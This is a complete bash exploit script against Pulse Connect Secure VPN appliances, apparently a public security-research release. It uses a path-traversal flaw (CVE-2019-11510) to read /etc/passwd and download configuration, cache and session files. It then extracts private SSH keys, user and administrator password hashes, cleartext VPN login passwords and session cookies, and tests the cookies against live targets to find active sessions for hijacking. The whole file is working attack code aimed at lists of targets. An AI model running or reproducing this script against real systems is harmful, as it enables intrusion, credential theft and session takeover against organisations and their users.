#!/bin/bash
#
# Script authored by braindead @BishopFox
# Based on research by Orange Tsai and Meh Chang:
# https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html
# Thanks also to Alyssa Herrera and 0xDezzy for additional insights
#

PROGNAME=${0##*/}
target_list=''
is_download=false
is_test_cookies=false
is_ssh_keys=false

DATA_DIR='./DATA'
URL_HOME='dana/home/index.cgi'
URL_DASHBOARD='dana-admin/misc/dashboard.cgi'
URL_VERSION='dana-na/nc/nc_gina_ver.txt'
URL_VULN_CHECK='dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/'
URL_DOWN_CONFIG='dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/system?/dana/html5acc/guacamole/'
URL_DOWN_CACHE='dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/'
URL_DOWN_SESSIONS='dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/randomVal/data.mdb?/dana/html5acc/guacamole/'

function print_usage {
  cat << EO
  [$PROGNAME by braindead @BishopFox]

  This script extracts private keys, usernames, admin details (including
  session cookies) and observed logins (including passwords) from Pulse
  Connect Secure VPN files downloaded via CVE-2019-11510.

  Usage: $PROGNAME [options]

  Options:
EO
  cat <<EO | column -s\& -t
        -h & show this output
        -t & set the target (IPs - single entry by stdin, in csv format, single column in a file)
        -d & download config, cache and sessions files
        -c & test cookies in order to identify active sessions
        -s & extract ssh keys
        -a & all tests
EO
  exit
}

function get_opts {
  local OPTIND
  if [[ "$@" == "" ]];then
    print_usage
  else
    while getopts ":ht:dcsa" opt;do
      case ${opt} in
        t ) target_list=$OPTARG
            ;;
        d ) is_download=true
            ;;
        c ) is_test_cookies=true
            is_download=true
            ;;
        s ) is_ssh_keys=true
            is_download=true
            ;;
        a ) is_download=true
            is_test_cookies=true
            is_ssh_keys=true
            ;;
        h ) print_usage
            ;;
        \? ) print_usage
            ;;
        : ) echo "Option -$OPTARG requires an argument." >&2
            ;;
      esac
    done
  fi
}

function check_target {
  echo "[#] Checking targets '${target_list}'"  
  if [ -f "${target_list}" ];then
    target_file=${target_list}
    target_list=''
    while read -r line;do
      target_list+="$(echo ${line} | egrep -o "(^([0-9]{1,3}\.){3}[0-9]{1,3}$)|(^[-\.a-zA-Z]+$)") "
    done < "${target_file}"
  else
    target_list=$(echo ${target_list} | egrep -o "(([0-9]{1,3}\.){3}[0-9]{1,3})|([-\.a-zA-Z]+)")
  fi
  target_list=$(echo ${target_list} | sed -E 's/\s/\n/g' | sort -u)
  if [ "${target_list}" == "" ];then
    echo "  [!] Target empty or unrecognized!"
    exit 1
  else
    target_list_domains=$(echo "${target_list}" | egrep "^[-\.a-zA-Z]+$")
    for d in $target_list_domains;do
      ip=$(dig +short ${d})
      if [ $(echo "${target_list}" | grep -c "^${ip}$") -ne 0 ];then
        echo "  [!] Discarding '${ip}' because it is alreay in queue as '${d}'"
        target_list=$(echo "${target_list}" | grep -v "^${ip}$")
      fi
    done
  fi
  echo "  [+] Targets: #$(echo ${target_list} | sed -E 's/\s/\n/g' | wc -l)"
  echo "    [+] Done"
}

function write_report {
  target_report_file=$DATA_DIR/$1/${1}_report.txt
  section_name=$2
  data=$3
  is_header=$4
  if [ $is_header == true ];then
    echo "=============================================================================" >> $target_report_file
    echo -e "\t\t\t\t $section_name" >> $target_report_file
    echo "=============================================================================" >> $target_report_file    
  fi
  echo -e "$data" | column -s\& -t >> $target_report_file
  echo >> $target_report_file
}

function extract_product_version {
  target=$1
  echo "  [#] Extracting product version..."
  curl -sk https://${target}/${URL_VERSION} --output $DATA_DIR/$target/${target}_version
  version=$(grep "PARAM NAME=\"ProductVersion\"" $DATA_DIR/$target/${target}_version 2> /dev/null | cut -d\" -f4)
  if [ $(echo $version | egrep -c "^([0-9]+\.)+[0-9]{3,6}$") -eq 1 ];then
    echo "    [+] Pulse Connect Secure: ${version}"
    write_report $target "Pulse Connect Secure version" "${version}" "true"
  else
    echo "    [-] Pulse Connect Secure version is not recognized!"
    rm -rf $DATA_DIR/$target
    return 1
  fi
}

function download_files {
  target=$1
  if [ $is_download == true ];then
    echo "  [#] Download is enabled"    
    echo "    [#] Check if vulnerable..."
    status=$(curl -skIo /dev/null -w "%{http_code}" --path-as-is https://${target}/${URL_VULN_CHECK})
    if [ "$status" == "200" ];then
      echo "      [+] Vulnerable!"
      echo "    [#] Downloading config (1/3)..."
      curl -sk --path-as-is https://${target}/${URL_DOWN_CONFIG} --output $DATA_DIR/$target/${target}_config
      echo "    [#] Downloading cache (2/3)..."
      curl -sk --path-as-is https://${target}/${URL_DOWN_CACHE} --output $DATA_DIR/$target/${target}_cache
      echo "    [#] Downloading sessions data (3/3)..."
      curl -sk --path-as-is https://${target}/${URL_DOWN_SESSIONS} --output $DATA_DIR/$target/${target}_sessions
      if [[ ! -f $DATA_DIR/$target/${target}_config || ! -f $DATA_DIR/$target/${target}_cache || ! -f $DATA_DIR/$target/${target}_sessions ]];then
        echo "      [-] Fail"
        return 1
      fi
      echo "      [+] Done"
    else
      echo "      [-] Not vulnerable"
      rm -rf $DATA_DIR/$target/${target}_*
      return 1
    fi
  else
    echo "  [!] Download is disabled"
  fi
}

# Extract private RSA keys used by the VPN server to SSH to other servers
function extract_ssh_keys {
  target=$1
  if [ $is_ssh_keys == true ];then
    echo "  [#] Extracting SSH keys..."
    ssh_keys=$(strings $DATA_DIR/$target/${target}_config | grep -Ezo "[\-]{5}BEGIN PRIVATE KEY[\-]{5}[^\-]*[\-]{5}END PRIVATE KEY[\-]{5}" | tr -d '\0' | sed -E 's/(-----)(-----)/\1\n\2/g')
    num=$(echo "${ssh_keys}" | egrep -c "[\-]{5}BEGIN PRIVATE KEY[\-]{5}" )
    echo "    [+] SSH keys: #$num"
    if [ $num -gt 0 ];then
      echo "      [+] Done"
      echo "${ssh_keys}" > $DATA_DIR/$target/${target}_ssh_keys
      write_report $target "SSH keys" "${ssh_keys}" "true"
    else
      echo "      [-] Fail"
    fi
  else
    echo "  [!] SSH keys extraction is disabled"
  fi
}

# Extract all users registered on the device itself. 
# This may not include details of users that authenticate externally.
function extract_local_users {
  target=$1
  if [ $is_download == true ];then
    echo "  [#] Extracting local users details..."
    strings $DATA_DIR/$target/${target}_config | grep "^login_" | cut -c7- | egrep "^[.a-zA-Z0-9]+(\\\\[a-zA-Z0-9]+)?\s*$" | sort -u > $DATA_DIR/$target/${target}_users
            > $DATA_DIR/$target/${target}_uids
            > $DATA_DIR/$target/${target}_hashes

    while IFS= read -r line;do
      line_esc=$(echo "$line" | sed 's/\\/\\\\\\\\/g')
      strings $DATA_DIR/$target/${target}_config | grep -A 4 "login_$line_esc" | grep -m 1 useruid | cut -c8- | cut -c -40 | echo "$line:$(cat)" >> $DATA_DIR/$target/${target}_uids
      strings $DATA_DIR/$target/${target}_config | grep -A 10 "$line_esc" | grep -m 1 danastre | echo "$line:$(cat)" >> $DATA_DIR/$target/${target}_hashes
    done < $DATA_DIR/$target/${target}_users

    sort -u $DATA_DIR/$target/${target}_uids -o $DATA_DIR/$target/${target}_uids
    sort -u $DATA_DIR/$target/${target}_hashes -o $DATA_DIR/$target/${target}_hashes

    data="Username & Unique ID & Password Hash (md5crypt)\n"
    while IFS= read -r uname;do
      uname_esc=$(echo "$uname" | sed 's/\\/\\\\\\\\/g')    
      uuid=$(egrep "^$uname_esc:" $DATA_DIR/$target/${target}_uids | cut -d: -f2)
      uhash=$(egrep "^$uname_esc:" $DATA_DIR/$target/${target}_hashes | cut -d: -f2)
      data+="$uname_esc & $uuid & $uhash\n"
    done < $DATA_DIR/$target/${target}_users
    write_report $target "Local User Details" "${data}" "true"
  else
    echo "  [!] Local users details extraction is disabled"
  fi
}

# Extract session cookies and match them to user UIDs and names
function extract_session_cookies {
  target=$1
  if [ $is_download == true ];then
    echo "  [#] Extracting session cookies..."
    > $DATA_DIR/$target/${target}_dsids
    strings $DATA_DIR/$target/${target}_sessions | while IFS= read -r line1;do
      cookie=$(echo "$line1" | grep ^randomVal | cut -c10-)
      if [ ${#cookie} -eq 32 ];then
        read -r line2
        uid=$(echo "$line2" | grep ^sid | cut -c4- | cut -c-40)
        if [ ${#uid} -eq 40 ];then
          user=$(grep "$uid" $DATA_DIR/$target/${target}_uids | tail -1 | cut -d: -f1)
          echo "$user:$uid:$cookie" >> $DATA_DIR/$target/${target}_dsids
        fi
      fi
    done
    sort -u $DATA_DIR/$target/${target}_dsids -o $DATA_DIR/$target/${target}_dsids
  else
    echo "  [!] Session cookies extraction is disabled"
  fi
}

function extract_admin_users {
  target=$1
  if [ $is_download == true ];then
    echo "  [#] Extracting administrators details..."
    # This information differs depending on the platform version. First look for
    # "Platform Administrator" (v9.x) - if found, the hash should be one line
    # below and the username should be one line above (it may or may not be 
    # prefixed with "login_"). If that is not found, look for "Administrators"
    # (v8.x) and grab the hash and username (with "login_") from the next 3 lines.
    # There may be multiple administrators.
    > $DATA_DIR/$target/${target}_admins
    if [[ -n $(grep -s -m1 "Platform Administrator" $DATA_DIR/$target/${target}_config) ]];then
      # Get v9 admin details
      user=""
      hash=""
      uid=""
      strings $DATA_DIR/$target/${target}_config | grep -B2 -A2 "Platform Administrator" | while IFS= read -r line;do
        if [ "$line" == "--" ];then
          user=""
          hash=""
          uid=""
          continue
        elif [[ $line =~ ^login_ ]];then
          user=$(echo "$line" | cut -c 7-)
        elif [[ $line =~ ^[a-fA-F0-9]{64} ]];then
          hash=$(echo "$line" | cut -c -64)
        fi
        if [[ -n "$user" && -n "$hash" ]];then
          uid=$(grep "^$user:" $DATA_DIR/$target/${target}_uids | cut -d: -f2)
          echo "$user:$hash:$uid" >> $DATA_DIR/$target/${target}_admins
          user=""
          hash=""
          uid=""
        fi
      done
    else
      # Get v8 admin details
      strings $DATA_DIR/$target/${target}_config | grep -A3 "^Administrators$" | while IFS= read -r line1;do
        user=""
        hash=""
        if [ "$line1" == "--" ];then
          continue
        fi
        read -r line2
        if [ "$line2" == "--" ];then
          continue
        fi
        read -r line3
        if [ "$line3" == "--" ];then
          continue
        fi
        read -r line4
        if [ "$line4" == "--" ];then
          continue
        fi
        for i in {2..4};do
          line="line$i"
          if [[ ${!line} =~ ^login_.*$ ]];then
            user=$(echo "${!line}" | cut -c 7-)
          elif [[ ${!line} =~ ^[a-fA-F0-9]{64}$ ]];then
            hash="${!line}"
          fi
        done
        if [ -n "$user$hash" ];then
          # We should have already found the admin user's UID above.
          uid=$(grep "^$user:" $DATA_DIR/$target/${target}_uids | cut -d: -f2)
          echo "$user:$hash:$uid" >> $DATA_DIR/$target/${target}_admins
        fi
      done
    fi

    data=""
    while IFS= read -r line;do
      adminuser=$(echo "$line" | cut -d: -f1)
      adminhash=$(echo "$line" | cut -d: -f2)
      adminuid=$(echo "$line" | cut -d: -f3)
      data+="Username: $adminuser\n"
      data+="Unique ID: $adminuid\n"
      data+="Password Hash (sha256(md5crypt)): $adminhash\n"
      if [ -n "$adminuid" ];then
        # These cookies are vulnerable to hijacking when used before they expire
        # or the user logs out. The admin site must be accessible to use these.
        data+="Session Cookies (DSIDs):\n"
        if [ $is_test_cookies == true ];then
          echo "  [#] Testing admin session cookies..."
          while IFS= read -r line;do
            uid=$(echo "$line" | cut -d: -f2)
            if [ "$uid" == "$adminuid" ];then
              cookie=$(echo "$line" | cut -d: -f3)
              output="$cookie"
              status=$(curl -Iks -b "DSID=$cookie" "https://${target}/${URL_DASHBOARD}" | head -1 | cut -d ' ' -f2)
              if [ "$status" == "200" ];then
                output="$output  **ACTIVE**"
              fi
              data+="$output\n"
            fi
          done < $DATA_DIR/$target/${target}_dsids
        else
          data+="$(grep "$adminuid" $DATA_DIR/$target/${target}_dsids | cut -d: -f3)\n"
        fi
      fi
    done < $DATA_DIR/$target/${target}_admins
    write_report $target "Administrator Details" "${data}" "true"
  else
    echo "  [!] Administrators details extraction is disabled"
  fi    
}

# Extract cached VPN client session authentication details.
# This will capture local and external authentications in clear text.
function extract_vpn_logins {
  target=$1
  if [ $is_download == true ];then
    echo "  [#] Extracting observed VPN logins..."

    strings $DATA_DIR/$target/${target}_config $DATA_DIR/$target/${target}_cache | grep -A 35 user@ > $DATA_DIR/$target/${target}_logins
    echo "--" >> $DATA_DIR/$target/${target}_logins

    data=""
    username=""
    password=""
    name=""
    email=""
    userdn=""
    department=""
    homedir=""
    operatingsystem=""
    macaddress=""
    language=""
    ipaddress=""
    timestamp=""
    lastuser=""
    while IFS= read -r line;do
      if [ "$username" != "$lastuser" ];then
        # Print session details (not all captured information is shown by default)
        if [[ "$timestamp" != "" ]] || [[ "$username" != "" && "$password" != "" ]];then
          lastuser_esc=$(echo "$lastuser" | sed 's/\\/\\\\\\\\/g')
          data+="$lastuser_esc & $password & $name & $email & $operatingsystem & $language & $ipaddress & $macaddress & $timestamp\n"
        fi
        lastuser="$username"
        password=""
        name=""
        email=""
        userdn=""
        department=""
        homedir=""
        operatingsystem=""
        macaddress=""
        language=""
        ipaddress=""
        timestamp=""
      else
        #get the details
        if [[ ! $line =~ user@|userName|userAttr|userAgent|callingStationId|language|loginHostAddr|userDN|localdomain|lastLogin|protocol|password@|^password$|^[0-9]+$|^[a-fA-F0-9]{32}$ ]];then
          case "$last" in
            user@*|sAMAccountName)
              if [ $(echo "$line" | grep -c "^.*+$") -eq 0 ];then
                username=$(echo "$line" | awk '{print tolower($0)}')
              fi
              if [ -z "$lastuser" ];then
                lastuser="$username"
              fi
              ;;
            password@*)
              if [[ $(echo "$line" | grep -c "^.*+$") -eq 0 && -z "$password" ]];then
                password="$line"
              fi
              ;;
            mail)
              if [ -z "$email" ];then
                email="$line"
              fi
              ;;
            userDN@*)
              if [ -z "$name" ];then
                name="$line"
              fi
              ;;
            userDNText@*)
              if [ -z "$userdn" ];then
                userdn="$line"
              fi
              ;;
            department)
              if [ -z "$department" ];then
                department="$line"
              fi
              ;;
            homeDirectory)
              if [ -z "$homedir" ];then
                homedir="$line"
              fi
              ;;
            radSessionID)
              if [ -z "$timestamp" ];then
                timestamp=$(echo "$line" | cut -d\" -f2)
              fi
              ;;
            userAgent)
              if [ -z "$operatingsystem" ];then
                operatingsystem=$(echo "$line" | sed -E 's/.*((Linux|Android|Windows(\sNT)?|Mac OS X|Macintosh)\s?[_\.0-9]*).*$/\1/' | grep -v "Pulse")
              fi
              ;;
            callingStationId)
              if [ -z "$macaddress" ];then
                macaddress="$line"
              fi
              ;;
            language)
              if [ -z "$language" ];then
                language=$(echo "$line" | egrep "^[a-zA-Z]{2}-[a-zA-Z]{2}$")
              fi
              ;;
            loginHostAddr)
              if [ -z "$ipaddress" ];then
                ipaddress="$line"
              fi
              ;;
            *)
              ;;
          esac
        fi
      fi
      last="$line"
    done < $DATA_DIR/$target/${target}_logins
    # Make sure we print the last entry
    if [ -n "$username" ];then
      if [[ "$username" != "" && "$password" != "" ]];then
        username_esc=$(echo "$username" | sed 's/\\/\\\\\\\\/g')
        data+="$username_esc & $password & $name & $email & $operatingsystem & $language & $ipaddress & $macaddress & $timestamp\n"
      fi
    fi
  
    # Look for any other usernames and passwords cached in base64
    if [ "$(echo "YQ==" | base64 -d 2>/dev/null)" == "a" ];then
      b64="d" # GNU base64
    else
      b64="D" # Mac base64
    fi

    # gets base64 strings from the same line with !PRIMARY! or on the following line
    data+=$(strings $DATA_DIR/$target/${target}_config $DATA_DIR/$target/${target}_cache | grep -A1 "\!PRIMARY\!" | grep -Ev "^\!PRIMARY\!$|NTLM" | sed '/^--$/d' | while IFS= read -r line;do
      i=0
      oldval=""
      newval=""
      valid=1
      while [ $valid -eq 1 ];do
        let "i+=4"
        oldval="$newval"
        newval=$(echo "${line: -$i}" | base64 -$b64 2>/dev/null)
        if [[ "$newval" == "" || $newval = *[![:ascii:]]* ]];then
          valid=0
          if [ "$oldval" != "" ];then
            echo "$oldval"
          fi
        fi
      done
    done | sort -u | sed 's/:/  /g')

    data=$(echo -e "${data}" | sort -u)
    data="Username & Password & Name & Email & OperatingSystem & Language & IPAddress & MACAddress & LastLogin\n"${data}
    write_report $target "Observed VPN Logins" "${data}" "true"
  else
    echo "  [!] Observed VPN logins extraction is disabled"
  fi    
}

function extract_vpn_session_cookies {
  target=$1
  if [ $is_download == true ];then
    echo "  [#] Extracting VPN session cookies (DSIDs)..."
    # These cookies are vulnerable to hijacking when used before they expire or
    # the user logs out. Once connected to the VPN, other exploits can be used.
    adminuids=( $(while IFS= read -r line;do echo "$line" | cut -d: -f3; done < $DATA_DIR/$target/${target}_admins) )
    data="Value & User\n" 
    if [ $is_test_cookies == true ];then
      # Test for active sessions (unless disabled)
      echo "    [#] Testing client session cookies..."
      while IFS= read -r line;do
        uid=$(echo "$line" | cut -d: -f2)
        # Skip admins
        skip=false
        for adminuid in "${adminuids[@]}";do
          if [ "$uid" == "$adminuid" ];then
            skip=true
          fi
        done
        if [ "$skip" = false ];then
          user=$(echo "$line" | cut -d: -f1)
          cookie=$(echo "$line" | cut -d: -f3)
          output="$cookie & $user"
          status=$(curl -Iks -b "DSID=$cookie" "https://${target}/${URL_HOME}" | head -1 | cut -d ' ' -f 2)
          if [ "$status" == "200" ];then
            output="$output  **ACTIVE**"
          fi
          data+="$output\n"
        fi
      done < $DATA_DIR/$target/${target}_dsids
    else
      guids=$( IFS='|'; echo "${adminuids[*]}" )
      data+="$(grep -Ev "$guids" $DATA_DIR/$target/${target}_dsids | awk '{ split($0,a,":"); print a[3], a[1] }')\n"
    fi
    write_report $target "VPN Session Cookies" "${data}" "true"
  else
    echo "  [!] VPN session cookies extraction is disabled"
  fi    
}

function init_data_dir {
  echo "[#] Save data in ${DATA_DIR}..."
  if [ ! -d "$DATA_DIR" ];then
    mkdir $DATA_DIR
  else
    action=''
    while [[ $action != 'y' && $action != 'n' ]];do
      echo "  [!] Dir ${DATA_DIR} already exists..."
      read -p "    [!] Do you want to remove it? (y/n): " action
    done
    if [ "$action" == 'y' ];then
      rm -rf $DATA_DIR
      mkdir $DATA_DIR
    fi
  fi
  echo "  [+] Done"
}

function init_data_target_dir {
  target=$1
  if [ -d "$DATA_DIR/$target" ];then
    rm -Rf $DATA_DIR/$target
  fi
  mkdir $DATA_DIR/$target
}


function main {
  get_opts "$@"
  check_target
  init_data_dir
  for target in ${target_list};do
    init_data_target_dir ${target}
    echo -e "\n[#] Exploiting '${target}'..."
    extract_product_version ${target} || continue
    download_files ${target} || continue
    extract_ssh_keys ${target}
    extract_local_users ${target}
    extract_session_cookies ${target}
    extract_admin_users ${target}
    extract_vpn_logins ${target}
    extract_vpn_session_cookies ${target}
  done
}

main "$@"
